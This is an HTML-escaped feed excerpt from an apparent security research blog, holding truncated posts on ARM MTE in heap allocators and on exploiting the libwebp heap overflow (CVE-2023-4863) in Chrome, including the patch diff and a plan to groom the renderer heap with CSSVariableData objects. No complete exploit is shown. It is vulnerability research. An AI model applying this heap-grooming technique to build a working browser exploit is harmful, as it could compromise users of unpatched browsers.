&lt;p&gt;MTE作为一个强大的内存破坏防御手段，对于它的防御边界、防御能力，和它对性能的影响，目前网上还未有对其全面的分析。此前，Google Project Zero发表了一系列&lt;a href=&#34;https://googleprojectzero.blogspot.com/2023/08/mte-as-implemented-part-1.html&#34;&gt;关于MTE的文章&lt;/a&gt;，其聚焦于较为底层的MTE安全性。然而MTE对于真实的软件安全性究竟有多大的影响仍是个未解之谜。想要讨论这个话题，各大堆分配器是一个很好的切入点。堆上的内存破坏问题已经逐渐成为二进制漏洞中的主流类型，参考MSRC于CppCon2019的&lt;a href=&#34;https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_09_CppCon/CppCon2019%20-%20Killing%20Uninitialized%20Memory.pdf&#34;&gt;议题&lt;/a&gt;内容：&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;3&#34; loading=&#34;lazy&#34; src=&#34;https://www.darknavy.org/zh/blog/strengthening_the_shield_mte_in_memory_allocators/assets/3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;通常普通开发者并不会直接使用MTE相关的汇编指令，而是依靠堆分配器自带的MTE支持间接使用，堆分配器就像盾牌一样，扛起了保护软件的任务。MTE提供了细颗粒管控内存的基础支持，如何基于硬件MTE能力实现高级安全功能的重任，留给了软件开发者。开源社区主流堆分配器积极响应，实现了基于MTE特性的安全增强，提高了堆空间的内存安全性。&lt;/p&gt;
&lt;p&gt;本文将以MTE的三个主要玩家：Chrome中的PartitionAlloc、Glibc中的Ptmalloc、Android中的Scudo为目标，对其中MTE相关的实现分别进行讨论，并对它们进行对比。我们在研究中发现了PartitionAlloc中实现的问题，并将此问题报告给了Google，得到了Chrome团队的确认。&lt;/p&gt;
&lt;h2 id=&#34;mte概述&#34;&gt;MTE概述&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;已了解MTE原理的读者可跳过此章节。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;MTE利用ARMv8的TBI (Top-Byte Ignore) 特性，使用指针的高4 bits存储tag，在每个进程中有一段专用的内存用于存储tag。当为内存指定了某个tag后，程序必须带上正确的tag访问内存，若tag错误，程序抛出错误信号SIGSEGV，如下图所示：&lt;/p&gt;
&lt;img src=&#34;assets/2.png&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34;/&gt;
&lt;p&gt;指令集提供了系列指令来操作tag，此处举例说明MTE的基本用法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;; x0 is a pointer
irg  x1, x0
stg  x1, [x1]
ldr  x0, [x1]
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;IRG (Insert Random Tag) 指令为指针x0生成一个随机tag，将结果保存至x1中。&lt;/li&gt;
&lt;li&gt;STG (Store Allocation Tag) 指令将tag应用至内存中，生效的长度取决于颗粒度，一般为16字节。&lt;/li&gt;
&lt;li&gt;LDR (Load Register) 使用带有tag的指针读取内存。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可以看到指令集中提供了底层的支持，但各个指令的使用有很大的自由度，MTE具体如何使用，很大程度上仍然取决于软件开发者。&lt;/p&gt;
&lt;h2 id=&#34;allocator&#34;&gt;Allocator&lt;/h2&gt;
&lt;h3 id=&#34;chrome---partitionalloc&#34;&gt;Chrome - PartitionAlloc&lt;/h3&gt;
&lt;h4 id=&#34;分配&#34;&gt;分配&lt;/h4&gt;
&lt;p&gt;PartitionAlloc中的分配可以大致分为三种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;从ThreadCache中分配，不变动tag直接返回。&lt;/li&gt;
&lt;li&gt;从空闲的SlotSpan中分配，不变动tag直接返回。&lt;/li&gt;
&lt;li&gt;若以上两种情况均不满足，分配一个新的SlotSpan，对其中所有空闲的堆块打上随机的tag&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PA_LIKELY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;use_tagging&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;// Ensure the MTE-tag of the memory pointed by other provisioned slot is
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// unguessable. They will be returned to the app as is, and the MTE-tag
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;// will only change upon calling Free().
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;next_slot_ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;n&#34;&gt;TagMemoryRangeRandomly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;next_slot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TagSizeForSlot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;slot_size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;释放&#34;&gt;释放&lt;/h4&gt;
&lt;p&gt;将堆块的tag加一。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploiting the libwebp Vulnerability, Part 2: Diving into Chrome Blink</title>
      <link>https://www.darknavy.org/zh/blog/exploiting_the_libwebp_vulnerability_part_2/</link>
      <pubDate>Fri, 03 Nov 2023 14:10:29 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/exploiting_the_libwebp_vulnerability_part_2/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
&lt;p&gt;当我们把这样一个在三方库中的漏洞放到真实的环境中再看时，会发现漏洞所处的环境往往有很多复杂的变量，想要利用这个漏洞并非想象般那么容易。&lt;/p&gt;
&lt;p&gt;我们所已知的信息有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我们溢出的变量&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/d53886d694334f194b267db3af165e5cd61ef489:third_party/libwebp/src/src/dec/vp8l_dec.c;l=437&#34;&gt;huffman_tables&lt;/a&gt;，大小为0x2f28&lt;/li&gt;
&lt;li&gt;该堆块在renderer的ThreadPool中分配，而大多数对象在主线程中分配&lt;/li&gt;
&lt;li&gt;我们可以以8字节倍数的offset，写入一个部分可控的4字节int&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Chrome中不同大小的堆块被存储在不同的bucket当中，不同大小的对象因为这个机制被安全地隔离开。通常来说，在chrome中的堆利用需要找到同样大小的对象进行布局，再通过UAF或是OOB篡改其他的对象，从而造成信息泄露或者控制流劫持。接下来我们会分享我们所发现的对象，同时试图去绕过这个机制。&lt;/p&gt;
&lt;h2 id=&#34;信息泄露&#34;&gt;信息泄露&lt;/h2&gt;
&lt;h3 id=&#34;寻找对象&#34;&gt;寻找对象&lt;/h3&gt;
&lt;p&gt;我们首先想要寻找的是一个合适的对象能够被OOB所改写，由于我们的越界写并不能很好地控制值，所以写指针基本被排除，最好的情况是能够改掉类似length这样的字段，对于值没有精确的要求，但是能够引发进一步更好利用的内存问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HuffmanCode&lt;/code&gt;在libwebp中是用&lt;code&gt;malloc&lt;/code&gt;分配的，在chrome中实际是被PartitionAlloc最终接管分配。在renderer中一共有四个&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/d53886d694334f194b267db3af165e5cd61ef489:third_party/blink/renderer/platform/wtf/allocator/Allocator.md&#34;&gt;partition&lt;/a&gt;，&lt;code&gt;LayoutObject partition&lt;/code&gt;, &lt;code&gt;Buffer partition&lt;/code&gt;, &lt;code&gt;ArrayBuffer partition&lt;/code&gt;, &lt;code&gt;FastMalloc partition&lt;/code&gt;。FastMalloc实际上最终调用的就是&lt;code&gt;malloc&lt;/code&gt;，因此我们想要找的对象可以用FastMalloc来分配。&lt;/p&gt;
&lt;p&gt;我们首先用了Man Yue Mo在&lt;a href=&#34;https://securitylab.github.com/research/one_day_short_of_a_fullchain_renderer/&#34;&gt;博客&lt;/a&gt;中提到的codeql查询，由于溢出在0x3000的bucket当中，可以选择的对象大小范围为0x2800 - 0x3000。但非常遗憾的是，查询结果为空，这个size下的对象几乎完全不存在。另一个思路是用溢出对象本身，但是这个对象被改掉后不会产生特别的破坏效果，libwebp中也没有其他好的候选对象。到了这里似乎令人觉得有些绝望，利用的第一步就被卡住了。&lt;/p&gt;
&lt;p&gt;那么我们还有什么思路呢，一个想法是使用可变长的对象，如Man Yue Mo提到过的&lt;code&gt;AudioArray&lt;/code&gt;，但是这个对象是纯数据，被改掉也没有用。查看所有FastMalloc的调用，最终我们发现了这个&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/main:third_party/blink/renderer/core/css/css_variable_data.h;drc=d53886d694334f194b267db3af165e5cd61ef489;l=22&#34;&gt;对象&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;CORE_EXPORT&lt;/span&gt; &lt;span class=&#34;nl&#34;&gt;CSSVariableData&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RefCounted&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CSSVariableData&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;USING_FAST_MALLOC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CSSVariableData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此对象的大小为动态的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;wtf_size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes_needed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CSSVariableData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;original_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Is8Bit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                       &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;original_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                       &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;original_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// ... snip ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Partitions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FastMalloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;bytes_needed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WTF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetStringWithTypeName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CSSVariableData&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;该对象代表了&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties&#34;&gt;CSS中的变量&lt;/a&gt;，可以通过以下方式来定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;element&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;foo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;my&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;blink会根据CSS变量的内容动态分配&lt;code&gt;CSSVariableData&lt;/code&gt;的内存。还有一个好消息是，JavaScript中也可以便捷地操作CSS变量。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// add a CSS variable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;element&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setProperty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// remove a CSS variable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;element&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;removeProperty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// get the value of a CSS variable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getComputedStyle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;element&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getPropertyValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;foo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cross-thread堆占位&#34;&gt;Cross-Thread堆占位&lt;/h3&gt;
&lt;p&gt;我们可以控制&lt;code&gt;CSSVariableData&lt;/code&gt;的大小，使其分配至与&lt;code&gt;HuffmanCode&lt;/code&gt;同样大小的bucket中。一个自然而然的计划是，分配一堆&lt;code&gt;CSSVariableData&lt;/code&gt;，然后free其中一个，再用&lt;code&gt;HuffmanCode&lt;/code&gt;占位，如下图所示。&lt;/p&gt;
&lt;img src=&#34;webp.assets/image-20231101172352708.png&#34; alt=&#34;image-20231101172352708&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 50%;&#34; /&gt;
&lt;p&gt;然而设想很美好，实际上PartitionAlloc中使用了&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/main:base/allocator/partition_allocator/src/partition_alloc/thread_cache.h;drc=9fc872d7a2507b4685051bd6a0d93349f668e6f8;l=241&#34;&gt;ThreadCache&lt;/a&gt;，对象的分配和释放都会优先在ThreadCache中进行。由于两个对象不在同一个线程中分配，我们需要想办法将&lt;code&gt;CSSVariableData&lt;/code&gt;从ThreadCache中移出。阅读&lt;a href=&#34;https://source.chromium.org/chromium/chromium/src/&amp;#43;/main:base/allocator/partition_allocator/src/partition_alloc/thread_cache.h;drc=9fc872d7a2507b4685051bd6a0d93349f668e6f8;l=519&#34;&gt;ThreadCache的源码&lt;/a&gt;，我们找到了一个途径&lt;/p&gt;</description>
    </item>
    <item>
      <title>Exploiting the libwebp Vulnerability, Part 1: Playing with Huffman Code</title>
      <link>https://www.darknavy.org/zh/blog/exploiting_the_libwebp_vulnerability_part_1/</link>
      <pubDate>Fri, 03 Nov 2023 14:10:24 +0800</pubDate>
      <guid>https://www.darknavy.org/zh/blog/exploiting_the_libwebp_vulnerability_part_1/</guid>
      <description>&lt;h2 id=&#34;漏洞定位&#34;&gt;漏洞定位&lt;/h2&gt;
&lt;p&gt;在初始的漏洞分析阶段，由于缺少现成的PoC或详细分析报告，我们首先尝试阅读并理解webmproject/libwebp上游仓库针对CVE-2023-4863的&lt;a href=&#34;https://github.com/webmproject/libwebp/commit/902bc9190331343b2017211debcec8d2ab87e17a&#34;&gt;修复代码&lt;/a&gt;。然而，WebM Project官方的修补过程相对复杂，这使得我们难以精确地锁定漏洞的原始触发点。&lt;/p&gt;
&lt;p&gt;于是，我们将目光转向了Apple对CVE-2023-41064的官方补丁，并使用BinDiff对更新前后的ImageIO组件进行了对比。我们注意到Apple的补丁代码变更相对较少，易于理解，并且非常“简单粗暴”:&lt;/p&gt;
&lt;img src=&#34;assets/1-diff.png&#34; alt=&#34;ImageIO patch in BinDiff&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 67%;&#34; /&gt;
&lt;img src=&#34;assets/2-diff.png&#34; alt=&#34;ImageIO patch in IDA Pro&#34; style=&#34;display: block; margin-left: auto; margin-right: auto; zoom: 67%;&#34; /&gt;
&lt;p&gt;简而言之，Apple的修复方案是在WebP解码器中增加了一项检查：如果在构建霍夫曼编码表 (Huffman Table) 时越界，就会直接返回错误，而不是继续解码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;diff --git a/src/dec/vp8l_dec.c b/src/dec/vp8l_dec.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;index 45012162..06b142bc 100644
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;--- a/src/dec/vp8l_dec.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+++ b/src/dec/vp8l_dec.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gu&#34;&gt;@@ -438,6 +438,7 @@ static int ReadHuffmanCodes(VP8LDecoder* const dec, int xsize, int ysize,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt;     goto Error;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+  bound = &amp;amp;huffman_tables[num_htree_groups * table_size];
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;   huffman_table = huffman_tables;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   for (i = 0; i &amp;lt; num_htree_groups_max; ++i) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     // If the index &amp;#34;i&amp;#34; is unused in the Huffman image, just make sure the
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;diff --git a/src/utils/huffman_utils.c b/src/utils/huffman_utils.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;index 90c2fbf7..13054715 100644
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gh&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;--- a/src/utils/huffman_utils.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+++ b/src/utils/huffman_utils.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gu&#34;&gt;@@ -191,6 +191,7 @@ static int BuildHuffmanTable(HuffmanCode* const root_table, int root_bits,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gu&#34;&gt;&lt;/span&gt;         }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         code.bits = (uint8_t)(len - root_bits);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         code.value = (uint16_t)sorted[symbol++];
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;+        if (bound &amp;amp;&amp;amp; &amp;amp;table[key &amp;gt;&amp;gt; root_bits + table_size] &amp;gt;= bound) return 0;
